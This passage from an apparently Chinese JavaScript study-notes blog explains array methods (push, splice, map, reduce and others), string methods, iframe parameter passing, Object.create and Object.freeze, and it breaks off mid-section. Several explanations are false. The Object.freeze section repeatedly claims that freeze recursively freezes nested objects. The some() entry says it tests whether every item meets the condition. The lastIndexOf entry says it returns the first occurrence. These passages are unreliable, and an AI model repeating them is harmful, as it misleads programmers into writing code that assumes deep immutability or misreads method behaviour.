<strong>数据)</strong></p><p><strong>作用:</strong> 就是往数组末尾添加数据</p><p><strong>返回值:</strong> 就是这个数组的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //push">var arr = [10, 20, 30, 40]<br>res = arr.push(20)<br>console.log(arr);//[10,20,30,40,20]<br>console.log(res);//5<br></code></pre></td></tr></table></figure><ol start="2"><li>pop（） 末尾出删除数据</li></ol><p><strong>语法:</strong> <strong>数组名.pop()</strong></p><p><strong>作用:</strong> 就是从数组的末尾删除一个数据</p><p><strong>返回值:</strong> 就是你删除的那个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //pop">var arr = [10, 20, 30, 40] <br>res =arr.pop()<br>console.log(arr);//[10,20,30]<br>console.log(res);//40<br></code></pre></td></tr></table></figure><ol start="3"><li>unshift（） 头部添加数据</li></ol><p><strong>语法:</strong> <strong>数组名.unshift(</strong> <strong>数据)</strong></p><p><strong>作用:</strong> 就是在数组的头部添加数据</p><p><strong>返回值:</strong> 就是数组的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //pop">var arr = [10, 20, 30, 40]<br>res=arr.unshift(99)<br>console.log(arr);//[99,10,20,30,40]<br>console.log(res);//5<br></code></pre></td></tr></table></figure><ol start="4"><li>shift（） 头部删除数据</li></ol><p><strong>语法:</strong> <strong>数组名.shift()</strong></p><p><strong>作用:</strong> 头部删除一个数据</p><p><strong>返回值:</strong> 就是删除掉的那个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //shift">var arr = [10, 20, 30, 40]<br>res=arr.shift()<br>console.log(arr);[20,30,40]<br>console.log(res);10<br></code></pre></td></tr></table></figure><ol start="5"><li>reverse（） 翻转数组</li></ol><p><strong>语法:</strong> <strong>数组名.reverse()</strong></p><p><strong>作用:</strong> 就是用来翻转数组的</p><p><strong>返回值:</strong> 就是翻转好的数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //reverse">var arr = [10, 20, 30, 40]<br>res=arr.reverse()<br>console.log(arr);//[40,30,20,10]<br>console.log(res);//[40,30,20,10]<br></code></pre></td></tr></table></figure><ol start="6"><li>sort（） 排序</li></ol><p>语法一: 数组名.sort() 会排序 会按照位排序</p><p>语法二: 数组名.sort(function (a,b) {return a-b}) 会正序排列</p><p>语法三: 数组名.sort(function (a,b) {return b-a}) 会倒序排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs //sort()">var arr = [2, 63, 48, 5, 4, 75, 69, 11, 23]<br>arr.sort()<br>console.log(arr);<br>arr.sort(function(a,b)&#123;return(a-b)&#125;)<br>console.log(arr);<br>arr.sort(function(a,b)&#123;return(b-a)&#125;)<br>console.log(arr);<br></code></pre></td></tr></table></figure><ol start="7"><li>splice（）  截取数组</li></ol><p>语法一: 数组名.splice(开始索引,多少个)</p><p>作用: 就是用来截取数组的</p><p>返回值: 是一个新数组 里面就是你截取出来的数据</p><p>语法二: 数组名.splice(开始索引,多少个,你要插入的数据)</p><p>作用: 删除并插入数据</p><p>注意: 从你的开始索引起</p><p>返回值: 是一个新数组 里面就是你截取出来的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs //splice()">var arr = [2, 63, 48, 5, 4, 75]<br>res = arr.splice(1,2)<br>console.log(arr);<br>console.log(res);<br>//******************************<br>//splice() 语法二<br>var arr = [2, 63, 48, 5, 4, 75]<br>res = arr.splice(1,1,99999,88888)<br>console.log(arr);<br>console.log(res);<br></code></pre></td></tr></table></figure><h5 id="二、不改变原数组的方法"><a href="#二、不改变原数组的方法" class="headerlink" title="二、不改变原数组的方法"></a>二、不改变原数组的方法</h5><ol><li>concat（）合并数组</li></ol><p><strong>语法:</strong> <strong>数组名.concat(</strong> <strong>数据)</strong></p><p><strong>作用:</strong> 合并数组的</p><p><strong>返回值:</strong> 一个新的数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //concat">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.concat(20,&quot;小敏&quot;,50)<br>console.log(arr) <br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="2"><li>join（） 数组转字符串</li></ol><p><strong>语法:</strong> <strong>数组名.join(‘</strong> <strong>连接符’)</strong></p><p><strong>作用:</strong> 就是把一个数组转成字符串</p><p><strong>返回值:</strong> 就是转好的一个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //join">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.join(&quot;+&quot;)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="3"><li>slice（）截取数组的一部分数据</li></ol><p><strong>语法:</strong> <strong>数组名.slice(</strong> <strong>开始索引,</strong> <strong>结束索引)</strong></p><p><strong>作用:</strong> 就是截取数组中的一部分数据</p><p><strong>返回值:</strong> 就是截取出来的数据 放到一个新的数组中</p><p><strong>注意:</strong> 包前不好后 包含开始索引不包含结束索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs //slice">var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.slice(1,4)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="4"><li>indexOf 从左检查数组中有没有这个数值</li></ol><p><strong>语法一:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据)</strong></p><p><strong>作用:</strong> 就是检查这个数组中有没有该数据</p><p>如果有就返回该数据<strong>第一次</strong>出现的索引</p><p>如果没有返回 -1</p><p><strong>语法二:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据,</strong> <strong>开始索引)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs //indexOf">//indexOf<br>复制代码var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.indexOf(10)<br>console.log(arr)<br>console.log(res);<br>//*************************************<br>//indexOf  语法二<br>var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.indexOf(10,1)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="5"><li>lastIndexOf 从右检查数组中有没有这个数值</li></ol><p><strong>语法一:</strong> <strong>数组名.indexOf(</strong> <strong>要查询的数据)</strong></p><p><strong>作用:</strong> 就是检查这个数组中有没有该数据</p><p>如果有就返回该数据<strong>第一次</strong>出现的索引</p><p>如果没有返回 -1</p><p><strong>语法二:</strong> <strong>数组名.lastIndexOf(</strong> <strong>要查询的数据,</strong> <strong>开始索引)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs //lastIndexOf">//lastIndexOf<br>复制代码var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.lastIndexOf(50)<br>console.log(arr) <br>console.log(res);<br>//*************************************<br>//lastIndexOf 语法二<br>var arr = [10, 20, 10, 30, 40, 50, 60]<br>res = arr.lastIndexOf(50,4)<br>console.log(arr)<br>console.log(res);<br></code></pre></td></tr></table></figure><h5 id="三、ES6新增的数组方法"><a href="#三、ES6新增的数组方法" class="headerlink" title="三、ES6新增的数组方法"></a>三、ES6新增的数组方法</h5><ol><li>forEach()  用来循环遍历的 for</li></ol><p>语法: 数组名.forEach(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 就是用来循环遍历数组的 代替了我们的for</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs //forEach">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.forEach(function (item, index, arr) &#123;<br>    console.log(item, &quot;------&quot;, index, &quot;-------&quot;, arr);<br>&#125;)<br></code></pre></td></tr></table></figure><ol start="2"><li>map  映射数组的</li></ol><p>语法: 数组名.map(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 就是用来映射</p><p>返回值: 必然是一个数组 一个映射完毕的数组；这个数组合原数组长度一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //map">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.map(function (item) &#123;<br>    return item*1000<br>&#125;)<br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="3"><li>filter  过滤数组</li></ol><p>语法: 数组名.filter(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 用来过滤数组的</p><p>返回值: 如果有就是过滤(筛选)出来的数据 保存在一个数组中；如果没有返回一个空数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //filter">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.filter(function (item) &#123;<br>    return item &gt; 2<br>&#125;)<br>console.log(res);<br></code></pre></td></tr></table></figure><ol start="4"><li>every  判断数组是不是满足所有条件</li></ol><p>语法: 数组名.every(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 主要是用来判断数组中是不是 每一个 都满足条件</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">只有所有的都满足条件返回的是<span class="hljs-literal">true</span><br><br>只要有一个不满足返回的就是<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>返回值: 是一个布尔值 注意: 要以return的形式执行返回条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //every">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.every(function (item) &#123;<br>    return item &gt; 0<br>&#125;)<br>console.log(res);//打印结果  true<br></code></pre></td></tr></table></figure><ol start="5"><li>some（） 数组中有没有满足条件的</li></ol><p>语法: 数组名.some(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 主要是用来判断数组中是不是 每一个 都满足条件</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">只有有一个满足条件返回的是<span class="hljs-literal">true</span><br><br> 只要都不满足返回的就是<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>返回值: 是一个布尔值</p><p>注意: 要以return的形式执行返回条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //some">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.some(function (item) &#123;<br>    return item &gt; 3<br>&#125;)<br>console.log(res);//true<br></code></pre></td></tr></table></figure><ol start="6"><li>find（）用来获取数组中满足条件的第一个数据</li></ol><p>语法: 数组名.find(function (item,index,arr) {})</p><ul><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 用来获取数组中满足条件的数据</p><p>返回值: 如果有 就是满足条件的第一个数据；如果没有就是undefined</p><p>注意: 要以return的形式执行返回条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs //find">var arr = [1, 2, 3, 4, 5]<br>console.log(&#x27;原始数组 : &#x27;, arr);<br>var res = arr.find(function (item) &#123;<br>    return item &gt; 3<br>&#125;)<br>console.log(res)//4<br></code></pre></td></tr></table></figure><ol start="7"><li>reduce（）叠加后的效果</li></ol><p>语法: 数组名.reduce(function (prev,item,index,arr) {},初始值)</p><ul><li>prev :一开始就是初始值 当第一次有了结果以后；这个值就是第一次的结果</li><li>item : 这个表示的是数组中的每一项</li><li>index : 这个表示的是每一项对应的索引</li><li>arr : 这个表示的是原数组</li></ul><p>作用: 就是用来叠加的</p><p>返回值: 就是叠加后的结果</p><p>注意: 以return的形式书写返回条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs //reduce">var arr = [1, 2, 3, 4, 5]<br>var res = arr.reduce(function (prev, item) &#123;<br>    return prev *= item<br>&#125;, 1)<br>console.log(res);//120<br></code></pre></td></tr></table></figure><h3 id="9、字符串方法总结"><a href="#9、字符串方法总结" class="headerlink" title="9、字符串方法总结"></a>9、字符串方法总结</h3><p>以下是 JavaScript 中常用的一些字符串方法，这些方法可用于处理和操作字符串：</p><ol><li><p><strong>字符串长度和基本操作</strong>：</p><ul><li><code>length</code>: 返回字符串的长度。</li><li><code>charAt(index)</code>: 返回指定位置的字符。</li><li><code>charCodeAt(index)</code>: 返回指定位置字符的 Unicode 编码。</li><li><code>concat(string1, string2, ...)</code>: 连接多个字符串并返回新字符串。</li><li><code>slice(start, end)</code>: 提取字符串的一部分。</li><li><code>substring(start, end)</code>: 提取字符串的一部分。</li><li><code>substr(start, length)</code>: 提取从指定位置开始的指定长度的子字符串。</li><li><code>indexOf(substring, start)</code>: 返回子字符串第一次出现的位置。</li><li><code>lastIndexOf(substring, start)</code>: 返回子字符串最后一次出现的位置。</li><li><code>startsWith(substring, start)</code>: 检查字符串是否以指定子字符串开头。</li><li><code>endsWith(substring, length)</code>: 检查字符串是否以指定子字符串结尾。</li></ul></li><li><p><strong>大小写转换</strong>：</p><ul><li><code>toUpperCase()</code>: 将字符串转换为大写。</li><li><code>toLowerCase()</code>: 将字符串转换为小写。</li></ul></li><li><p><strong>字符串替换和剪裁</strong>：</p><ul><li><code>replace(oldSubstring, newSubstring)</code>: 替换字符串中的子字符串。</li><li><code>trim()</code>: 去除字符串两端的空格。</li><li><code>trimStart()</code> 或 <code>trimLeft()</code>: 去除字符串开头的空格。</li><li><code>trimEnd()</code> 或 <code>trimRight()</code>: 去除字符串末尾的空格。</li></ul></li><li><p><strong>分割和连接字符串</strong>：</p><ul><li><code>split(separator, limit)</code>: 将字符串拆分为数组，根据指定的分隔符。</li><li><code>join(separator)</code>: 将数组元素连接成一个字符串，使用指定的分隔符。</li></ul></li><li><p><strong>提取字符或子字符串</strong>：</p><ul><li><code>substring(start, end)</code>: 提取字符串的一部分，类似于 <code>slice</code>。</li><li><code>substr(start, length)</code>: 提取从指定位置开始的指定长度的子字符串。</li></ul></li><li><p><strong>正则表达式</strong>：</p><ul><li><code>match(regexp)</code>: 在字符串中查找匹配正则表达式的子字符串。</li><li><code>search(regexp)</code>: 查找字符串中匹配正则表达式的位置。</li><li><code>replace(regexp, newSubstring)</code>: 使用正则表达式替换字符串中的匹配项。</li><li><code>split(regexp, limit)</code>: 使用正则表达式拆分字符串为数组。</li></ul></li><li><p><strong>其他方法</strong>：</p><ul><li><code>charAt(index)</code>: 返回指定位置的字符。</li><li><code>charCodeAt(index)</code>: 返回指定位置字符的 Unicode 编码。</li><li><code>includes(substring)</code>: 检查字符串是否包含指定子字符串。</li><li><code>repeat(count)</code>: 复制字符串指定次数。</li><li><code>localeCompare(compareString)</code>: 比较两个字符串并返回一个指示顺序的数字。</li><li><code>padStart(targetLength, padString)</code>: 在字符串的开头用指定字符填充。</li><li><code>padEnd(targetLength, padString)</code>: 在字符串的结尾用指定字符填充。</li></ul></li></ol><p>这些方法可以用于处理和操作字符串的各种需求，根据具体情况选择合适的方法来进行字符串操作。</p><h3 id="10、iframe传参"><a href="#10、iframe传参" class="headerlink" title="10、iframe传参"></a>10、iframe传参</h3><p>在前端开发中，通过 <code>&lt;iframe&gt;</code> 元素传递参数通常需要使用一些技巧，因为 <code>&lt;iframe&gt;</code> 自身并不直接支持参数传递。以下是一些常见的方法来实现通过 <code>&lt;iframe&gt;</code> 传递参数的方式：</p><p><strong>1. URL 查询参数：</strong> 通过在 <code>&lt;iframe&gt;</code> 的 <code>src</code> 属性中添加查询参数来传递参数。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;iframe.html?param1=value1&amp;param2=value2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后，您可以在 <code>iframe.html</code> 中使用 JavaScript 来获取这些参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);<br><span class="hljs-keyword">const</span> param1 = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;param1&quot;</span>);<br><span class="hljs-keyword">const</span> param2 = params.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;param2&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>2. postMessage：</strong> 使用 <code>window.postMessage</code> 方法可以跨域传递数据，这对于与 <code>&lt;iframe&gt;</code> 内部的文档通信非常有用。在父文档中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);<br>iframe.<span class="hljs-property">contentWindow</span>.<span class="hljs-title function_">postMessage</span>(&#123;<span class="hljs-attr">param1</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-attr">param2</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;, <span class="hljs-string">&#x27;*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>在 <code>&lt;iframe&gt;</code> 内部的文档中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">origin</span> === <span class="hljs-string">&#x27;父文档的域名&#x27;</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = event.<span class="hljs-property">data</span>;<br>    <span class="hljs-comment">// 处理传递过来的数据</span><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>请注意，<code>&#39;*&#39;</code> 表示允许从任何源发送消息。在实际应用中，应该更加安全地设置消息的来源。</p><p><strong>3. localStorage 或 sessionStorage：</strong> 您还可以使用浏览器的 <code>localStorage</code> 或 <code>sessionStorage</code> 存储数据，然后在 <code>&lt;iframe&gt;</code> 中读取：</p><p>在父文档中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;param1&quot;</span>, <span class="hljs-string">&quot;value1&quot;</span>);<br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;param2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);<br></code></pre></td></tr></table></figure><p>在 <code>&lt;iframe&gt;</code> 内部的文档中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> param1 = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;param1&quot;</span>);<br><span class="hljs-keyword">const</span> param2 = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;param2&quot;</span>);<br></code></pre></td></tr></table></figure><p>这些方法都可以用来在 <code>&lt;iframe&gt;</code> 和其父文档之间传递参数，具体取决于您的需求和安全性要求。选择最适合您的情况的方法，并确保在跨域通信时采取适当的安全措施。</p><h3 id="11、Object-create-的使用场景"><a href="#11、Object-create-的使用场景" class="headerlink" title="11、Object.create()的使用场景"></a>11、Object.create()的使用场景</h3><p><code>Object.create()</code> 方法是JavaScript中用于创建新对象的方法。它的主要作用是创建一个新对象，并将该对象的原型（prototype）设置为传入的对象，从而实现原型继承。<code>Object.create()</code> 方法的使用场景包括：</p><ol><li><p><strong>原型继承：</strong> 最常见的用途是创建一个对象，使其继承另一个对象的属性和方法。这是JavaScript中实现原型继承的一种方式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> parent = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent);<br>child.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出 &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>对象克隆：</strong> 可以使用<code>Object.create()</code>方法创建一个与现有对象具有相同原型的新对象，从而创建对象的副本。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> originalObject = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> cloneObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(originalObject));<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(cloneObject, originalObject);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cloneObject); <span class="hljs-comment">// 包含与originalObject相同的属性</span><br></code></pre></td></tr></table></figure></li><li><p><strong>使用不同原型链：</strong> 您可以使用<code>Object.create()</code>方法创建具有不同原型链的对象，以实现对象之间的多继承或组合。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> parent1 = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from parent1!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> parent2 = &#123;<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from parent2!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent1);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(child, parent2);<br><br>child.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出 &quot;Hello from parent2!&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>创建具有特定原型的空对象：</strong> 您可以创建一个空对象，并将其原型设置为<code>null</code>或其他自定义原型，以构建特定类型的对象。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> emptyObject = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 创建一个没有原型的空对象</span><br></code></pre></td></tr></table></figure></li></ol><p>总之，<code>Object.create()</code>方法的主要使用场景涵盖了原型继承、对象克隆、多继承或组合以及创建具有特定原型的空对象等情况。它是JavaScript中实现灵活对象创建和继承的重要工具之一。</p><h3 id="12、object-freeze原理？深层对象可以freeze吗？freeze-hook实现修改freeze住的字段？"><a href="#12、object-freeze原理？深层对象可以freeze吗？freeze-hook实现修改freeze住的字段？" class="headerlink" title="12、object.freeze原理？深层对象可以freeze吗？freeze hook实现修改freeze住的字段？"></a>12、object.freeze原理？深层对象可以freeze吗？freeze hook实现修改freeze住的字段？</h3><p><code>Object.freeze()</code> 是JavaScript中的一个方法，用于冻结对象，使其变得不可修改。冻结后的对象无法添加、删除或修改属性或属性的值。<code>Object.freeze()</code> 的原理如下：</p><ol><li><p>它递归遍历对象的属性，将每个属性的 writable 特性设置为 <code>false</code>，从而阻止修改属性的值。</p></li><li><p>如果属性的值本身是一个对象，<code>Object.freeze()</code> 也会递归冻结该对象，从而使整个对象变成不可修改的。</p></li><li><p>它还将 configurable 特性设置为 <code>false</code>，阻止删除属性和修改属性的特性。</p></li></ol><p>因此，一旦调用了 <code>Object.freeze()</code>，对象就会变成不可变的，无法再对其进行任何修改。</p><p>关于深层对象（嵌套对象）是否可以冻结，答案是可以的。<code>Object.freeze()</code> 会递归地冻结对象中的所有嵌套对象，使整个对象图变得不可修改。这意味着深层嵌套的对象、数组等也都会变得不可修改。</p><p>以下是一个示例，演示了如何使用 <code>Object.freeze()</code> 冻结深层对象：</p><figure class="highlight 